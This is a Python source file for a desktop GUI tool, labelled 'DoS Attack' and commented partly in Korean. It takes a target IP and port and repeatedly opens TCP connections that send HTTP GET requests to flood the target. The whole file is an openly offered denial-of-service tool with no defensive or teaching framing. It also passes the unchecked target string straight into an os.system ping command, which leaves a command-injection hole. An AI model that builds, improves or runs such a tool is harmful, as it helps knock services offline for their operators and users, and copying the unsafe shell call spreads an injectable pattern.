import tkinter as tk
from tkinter import messagebox
import socket
import threading
import psutil
import os

class DoSAttack:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("DoS Attack")
        self.root.geometry("300x250")

        self.target_label = tk.Label(self.root, text="Target IP:")
        self.target_label.pack()
        self.target_entry = tk.Entry(self.root)
        self.target_entry.pack()

        self.port_label = tk.Label(self.root, text="Target Port:")
        self.port_label.pack()
        self.port_entry = tk.Entry(self.root)
        self.port_entry.pack()

        self.ram_label = tk.Label(self.root, text="Max RAM Usage (%):")
        self.ram_label.pack()
        self.ram_entry = tk.Entry(self.root)
        self.ram_entry.pack()

        self.thread_label = tk.Label(self.root, text="Number of Threads:")
        self.thread_label.pack()
        self.thread_var = tk.IntVar()
        self.thread_var.set(1)
        self.thread_option_menu = tk.OptionMenu(self.root, self.thread_var, *range(1, min(psutil.cpu_count(), 64) + 1))
        self.thread_option_menu.pack()

        self.start_button = tk.Button(self.root, text="Start Attack", command=self.start_attack)
        self.start_button.pack()

        self.live_attack_label = tk.Label(self.root, text="Attack Status: Offline")
        self.live_attack_label.pack()

        self.root.mainloop()

    def start_attack(self):
        target_ip = self.target_entry.get()
        target_port = int(self.port_entry.get())
        max_ram = int(self.ram_entry.get())
        num_threads = self.thread_var.get()

        if num_threads > psutil.cpu_count():
            messagebox.showwarning("Warning", "Number of threads exceeds available CPU cores.")
            return

        if num_threads > 64:
            messagebox.showerror("Error", "Number of threads cannot exceed 64.")
            return

        if target_ip == socket.gethostbyname(socket.gethostname()):
            messagebox.showwarning("Warning", "Do not target your own IP address.")
            return

        if not self.ping(target_ip):
            messagebox.showerror("Error", "Ping to target IP failed. Target IP might be fake.")
            return

        self.attack_thread = threading.Thread(target=self.attack, args=(target_ip, target_port, max_ram, num_threads))
        self.attack_thread.start()

    def ping(self, target_ip):
        response = os.system("ping -n 1 " + target_ip)  # Windows 환경에서의 Ping 명령어
        return response == 0  # 응답이 있는지 확인

    def attack(self, target_ip, target_port, max_ram, num_threads):
        self.live_attack_label.config(text="Attack Status: Online", fg="red")

        while True:
            try:
                current_ram = psutil.virtual_memory().percent
                if current_ram >= max_ram:
                    messagebox.showwarning("Warning", f"Current RAM usage is {current_ram}%. Maximum allowed RAM usage is {max_ram}%. Attack stopped.")
                    self.live_attack_label.config(text="Attack Status: Offline", fg="black")
                    return

                for _ in range(num_threads):
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.connect((target_ip, target_port))
                    s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
                    s.sendto(("Host: " + target_ip + "\r\n\r\n").encode('ascii'), (target_ip, target_port))
                    s.close()
            except:
                pass

if __name__ == "__main__":
    attack = DoSAttack()
